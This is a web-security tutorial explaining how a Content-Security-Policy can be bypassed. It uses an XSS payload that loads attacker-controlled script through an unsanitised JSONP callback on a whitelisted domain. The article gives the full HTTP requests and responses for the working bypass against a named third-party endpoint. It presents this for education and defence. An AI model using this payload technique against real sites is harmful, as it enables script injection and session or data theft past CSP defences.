
# Bypassing CSP with JSONP Endpoints

## Introduction

HTTP's Content-Security-Policy (CSP) mechanism provides a means to instruct
web browsers to apply various restrictions to the content returned by any
given HTTP request. Such content could actually be under the control of a
malicous party if a vulnerability such as Cross-Site Scripting (XSS) exists.
A CSP policy can instruct browsers to only execute scripts from particular
sources, not the vulnerable returned content, and thereby providing a
secondary layer of protection against XSS attacks.

There are some circumstances under which CSP policies can be evaded. This
article will examine defeating a CSP policy abusing JSONP endpoints that
reside on a site that the CSP policy considers trusted.

## A Demonstration of Breaking CSP with JSONP Endpoints

### Example Web Site

First, let's take a look at a page on our example web site at
www.example.com/csp that contains a trivial XSS vulnerability.

A request with a XSS payload:

```
GET /csp/?name=Hal<script>alert(222)</script> HTTP/1.1
Host: www.example.com
```

And the response with the payload returned verbatim:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...

<html>
<body>
Hello Hal<script>alert(222)</script>
</body>
</html>
```

Needless to say, this executes in a browser:

![Demonstration Payload Executing in a Browser][20_hello_ss]

Now let's try mitigating this using CSP.  As part of our remediation
efforts, we add a Content-Security-Policy response header as a safeguard
against any XSS vulnerabilities on our site.  We whitelist m.addthis.com
because we use AddThis on some other pages on our www.example.com site. 
Here's the same response to the above request with our CSP:

```
HTTP/1.1 200 OK
Content-Security-Policy: script-src https://m.addthis.com
Content-Type: text/html; charset=utf-8
...

<html>
<body>
Hello Hal<script>alert(222)</script>
</body>
</html>
```

We can now see that thanks to CSP, the payload no longer executes in a
browser. Furthermore, a violation error message is logged in the console:

![XSS Payload Blocked by CSP][40_blocked_with_csp_ss]

There's a problem, however. m.addthis.com contains a JSONP endpoint at
/live/red_lojson/100eng.json.  

Here's an example of normal useage:

```
GET /live/red_lojson/100eng.json?callback=exampleCallback HTTP/1.1
Host: m.addthis.com
```

```
HTTP/1.1 200 OK
Content-Type: application/javascript;charset=utf-8
...

exampleCallback({"loc":"NDQxMjdOQVVTT0gyMjE1MDk4MzUxMDAwMDBDSA=="});
```

This JSONP endpoint at m.addthis.com is particularly helpful because the
input is not sanitized at all.  Anything in the "callback" query string
parameter is returned verbatim as a script. We can change the "callback"
parameter to make m.addthis.com return completely arbitrary Javascript:

```
GET /live/red_lojson/100eng.json?callback=alert(222)// HTTP/1.1
Host: m.addthis.com
```
```
HTTP/1.1 200 OK
Content-Type: application/javascript;charset=utf-8
...

alert(222)//({"loc":"NDQxMjdOQVVTT0gyMjE1MDk4MzUxMDAwMDBDSA=="});
```

Now let's modify our previous request to use this to bypass CSP:

```
GET /csp/?name=Hal<script+src%3d"https%3a//m.addthis.com/live/red_lojson/100eng.json%3fcallback%3dalert(222)//"></script> HTTP/1.1
Host: www.example.com
```
```
HTTP/1.1 200 OK
Content-Security-Policy: script-src https://m.addthis.com
Content-Type: text/html; charset=utf-8
...

<html>
<body>
Hello Hal<script src="https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(222)//"></script>
</body>
</html>
```

Now our Javascript payload is returned from the whitelisted m.addthis.com
domain instead of www.example.com:

![CSP Bypassed][50_csp_bypassed]

The CSP has been successfully bypassed and our code is executing thanks to
the unconsidered JSONP endpoint in a whitelisted domain.

## Conclusion

CSP is a powerful mechanism which can prevent the exploitation of XSS
vulnerabilities.  However, always remember that it is a secondary layer of
protection.  Always strive to fix vulnerabilities at their source and not
rely exclusively on a safety net.

### References

Ebrahem Hegazy's list of public JSONP endpoints useful for CSP bypass: 
https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt

Google's CSP Evaluator tool: https://csp-evaluator.withgoogle.com/

[20_hello_ss]: 20_hello_ss.png "Screen Shot of XSS Payload Executing"
[50_csp_bypassed]: 50_csp_bypassed.png "Screen Shot of XSS Payload Bypassing CSP"
[40_blocked_with_csp_ss]: 40_blocked_with_csp_ss.png  "Screen Shot of XSS Payload Blocked by CSP"
